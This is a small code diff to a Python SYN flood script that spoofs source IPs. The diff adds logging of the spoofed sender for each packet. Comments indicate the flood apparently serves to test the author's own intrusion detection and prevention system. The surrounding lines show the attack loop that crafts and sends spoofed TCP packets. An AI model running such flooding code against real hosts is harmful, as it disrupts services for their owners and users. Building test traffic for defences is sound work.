@@ -25,6 +25,7 @@ def SYN_Flood(dstIP,dstPort,counter):
         #To make it easier for our IDPS to mitigate the attack
         #We limited the scope of the attack to 7 different IPs
         IP_Packet.src = ip_list[random.randint(0,6)]
+        IP_Sender = IP_Packet.src
         IP_Packet.dst = dstIP
 
         TCP_Packet = TCP ()
@@ -36,6 +37,7 @@ def SYN_Flood(dstIP,dstPort,counter):
 
         send(IP_Packet/TCP_Packet, verbose=0)
         total+=1
+        print(f"Packet sent from {IP_Sender}")
     sys.stdout.write("\nTotal packets sent: %i\n" % total)
 
 def into():
